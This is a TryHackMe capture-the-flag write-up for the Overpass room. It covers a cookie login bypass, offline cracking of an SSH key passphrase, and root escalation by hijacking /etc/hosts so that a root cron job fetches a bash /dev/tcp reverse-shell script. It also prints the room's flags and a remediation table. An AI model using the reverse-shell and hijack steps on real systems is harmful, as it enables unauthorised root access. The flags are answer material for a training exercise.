# Overpass | TryHackMe Write-up

> **TL;DR:** Bypassed the login page by reading its JavaScript source - the auth check skips directly to setting a cookie, so setting `SessionToken` to any non-empty value in browser dev tools grants admin access. The admin page revealed an encrypted SSH private key for James, whose passphrase (`james13`) fell to John. From James's shell, a world-writable `/etc/hosts` and a cron job that curl-pipes a script from `overpass.thm` allowed full DNS hijacking: pointing the domain at the attacker's machine and serving a reverse shell as `buildscript.sh` gave a root callback on the next cron tick.

|  |  |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Overpass](https://tryhackme.com/room/overpass) |
| **Difficulty** | Easy |
| **Category** | Linux · broken authentication · cron exploitation |
| **Date completed** | 2026-07-11 |
| **Author** | Kevin Jose |

**Tools used:** `nmap` · browser DevTools · `ssh2john` · `john` · `ssh` · `nano` · `python3 -m http.server` · `nc`
**Vulnerabilities covered:** Broken authentication / cookie manipulation (CWE-302 / OWASP A07) · Weak SSH key passphrase (CWE-521) · World-writable `/etc/hosts` (CWE-732) · Cron job fetching and executing remote script without integrity check (CWE-494)

---

## 1. Overview

Overpass is an Easy-rated Linux box themed around a fictitious password manager. The attack has two distinct stages. First, reading the login page's own JavaScript reveals the entire authentication logic - the server either returns `"Incorrect credentials"` or a valid session cookie, so bypassing login is just setting that cookie yourself in the browser. The admin page then hands over an encrypted SSH key for user `james`, whose passphrase is weak enough to crack offline. Second, privilege escalation exploits a cron job running as root that fetches and pipes a shell script from the hostname `overpass.thm` - a hostname that `james` can reroute by editing the world-writable `/etc/hosts`. Pointing that hostname at the attacker's machine and serving a malicious `buildscript.sh` delivers a root shell on the next cron tick.

> **Note:** TryHackMe assigns a fresh IP each time the machine is deployed, so the target address differs between screenshots. Commands below use `$IP` as a placeholder - set it once per session with `export IP=<machine-ip>` and every command resolves automatically.

---

## 2. Reconnaissance

**Service scan:**

```bash
nmap -sV $IP
```

Key findings - **2 open ports**:

- **22/tcp** - OpenSSH (Ubuntu)
- **80/tcp** - HTTP (Overpass web application)

The entire attack surface is the web app on port 80 plus the SSH service reached once credentials are recovered.

---

## 3. Exploitation - Web Authentication Bypass

**Vulnerability:** Broken client-side authentication logic - cookie set without server-side validation **(CWE-302)**

**Why it works:** Reading the login page's JavaScript source (`/login.js`) reveals the full authentication flow. The `login()` function POSTs to `/api/login` and checks the response text. If it equals `"Incorrect credentials"` it shows an error; **in every other case** it calls `Cookies.set("SessionToken", statusOrCookie)` and redirects to `/admin`. There is no requirement for the cookie value to be a valid server-issued token - any non-empty value works.

```javascript
async function login() {
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
    } else {
        Cookies.set("SessionToken", statusOrCookie)
        window.location = "/admin"
    }
}
```

**Steps**

1. Browse to `http://$IP/login.js` (or view source on the login page) to read the auth logic.
2. Open browser DevTools → Application → Cookies. Add a new cookie:
   - Name: `SessionToken`
   - Value: `anything` (any non-empty string)
3. Navigate to `http://$IP/admin`.

**Result:** Admin panel accessed without valid credentials.

The admin page contains a message from "Paradox" to James, along with James's **passphrase-protected RSA private key**. The message notes that the "Military Grade" encryption on the key is weak enough to crack yourself.

---

## 4. Foothold - SSH Key Cracking

**Steps**

1. Copy the private key from the admin page into a local file `id_rsa_james` and set correct permissions:

   ```bash
   chmod 600 id_rsa_james
   ```

2. Convert the key to a John-crackable hash:

   ```bash
   python3 /usr/share/john/ssh2john.py id_rsa_james > id_rsa_james.hash
   ```

3. Crack the passphrase:

   ```bash
   john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_james.hash
   ```

   John recovered the passphrase instantly:

   ```
   james13    (id_rsa_james)
   ```

4. Log in as `james`:

   ```bash
   ssh -i id_rsa_james james@$IP
   # passphrase: james13
   ```

**Result:** SSH shell as `james`.

---

## 5. User Flag & Enumeration

From James's home directory:

```bash
ls        # todo.txt  user.txt
cat user.txt
```

**User flag:** `thm{65c1aaf000506e56996822c6281e6bf7}`

Reading `todo.txt` reveals a crucial clue:

```
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

This hints at an automated process fetching a script. Checking the crontab:

```bash
cat /etc/crontab
```

Reveals a root cron job running every minute:

```
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

This fetches `buildscript.sh` from `overpass.thm` and pipes it directly into bash as root - with no integrity verification. The hostname `overpass.thm` is resolved via `/etc/hosts`. Checking the file permissions:

```bash
ls -la /etc/hosts
# -rw-rw-rw-  (world-writable)
```

The `/etc/hosts` file is writable by any user - including `james`.

---

## 6. Privilege Escalation - Cron DNS Hijack

**Vector:** World-writable `/etc/hosts` + cron job that curl-pipes a remote script as root, without integrity checking (CWE-732 / CWE-494).

**Why it works:** Because `james` can edit `/etc/hosts`, he can reroute `overpass.thm` to any IP - including the attacker's machine. The cron job will then fetch whatever `buildscript.sh` the attacker serves from that IP and execute it as root.

**Steps**

1. On the target, edit `/etc/hosts` to point `overpass.thm` at the attacker's machine:

   ```bash
   nano /etc/hosts
   # Add: <attacker-ip>  overpass.thm
   ```

   Verify the reroute resolves:

   ```bash
   ping -c 1 overpass.thm
   # PING overpass.thm (<attacker-ip>)
   ```

2. On the attacker machine, create the malicious `buildscript.sh` at the path the cron job requests - `downloads/src/buildscript.sh`:

   ```bash
   mkdir -p downloads/src
   echo 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1' > downloads/src/buildscript.sh
   ```

3. Start a Python HTTP server on the attacker machine so the cron job can fetch the file:

   ```bash
   sudo python3 -m http.server 80
   ```

   Within a minute the server logs the incoming request:

   ```
   10.145.163.173 - [11/Jul/2026 04:54:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
   ```

4. Open a Netcat listener on the attacker machine:

   ```bash
   nc -lvnp 4444
   ```

5. On the next cron tick (up to 60 seconds), the reverse shell connects:

   ```
   connect to [<attacker-ip>] from (UNKNOWN) [$IP]
   bash: no job control in this shell
   root@ip-...:~#
   ```

6. Verify and read the root flag:

   ```bash
   id
   # uid=0(root) gid=0(root) groups=0(root)
   cat root.txt
   ```

**Result:** Root shell via cron DNS hijack.

**Root flag:** `thm{7f336f8c359dbac18d54fdd64ea753bb}`

---

## 7. Remediation

| Finding | Risk | Remediation |
|---|---|---|
| Client-side authentication logic (`SessionToken` cookie bypass) | Unauthenticated access to admin panel | Perform all authentication checks server-side; never rely on a client-side response value to grant access. Validate session tokens cryptographically on the server on every request. |
| Weak SSH key passphrase (`james13`) | Offline cracking of an exposed private key | Enforce strong passphrases on all SSH keys (12+ chars, non-dictionary); rotate any exposed keys immediately. |
| Encrypted private key exposed on a web page | Key theft without attacking the host | Never store or display private keys in web interfaces; use key-based auth configured server-side only. |
| World-writable `/etc/hosts` | Any local user can reroute arbitrary hostnames | Set `/etc/hosts` permissions to `644` (root read/write, others read-only): `chmod 644 /etc/hosts`. |
| Cron job curl-piping a remote script without verification | Arbitrary code execution as root via DNS/HTTP hijack | Never pipe remote scripts directly into a shell; use checksums or signed packages; restrict cron script paths to local, root-owned locations; avoid resolving hostnames in cron commands. |

---

## 8. Lessons Learned

- Reading page source before launching tools is faster and quieter than running scanners - the entire auth bypass was on the page itself.
- `curl <url> | bash` in a cron job is a remote-execution primitive waiting to be exploited; the only things standing between "low-privilege user" and "root shell" were `/etc/hosts` permissions, and they were wrong.
- The `todo.txt` drop was a good habit to build: reading loot files before jumping straight to privesc tooling gave the escalation path immediately.

---

## 9. References

- Room: https://tryhackme.com/room/overpass
- CWE-302: Authentication Bypass by Assumed-Immutable Data - https://cwe.mitre.org/data/definitions/302.html
- CWE-732: Incorrect Permission Assignment for Critical Resource - https://cwe.mitre.org/data/definitions/732.html
- CWE-494: Download of Code Without Integrity Check - https://cwe.mitre.org/data/definitions/494.html
- OWASP A07:2021 Identification and Authentication Failures - https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/

---

*Lab conducted in an authorised, isolated training environment (TryHackMe). All activity was performed against systems I am explicitly permitted to test.*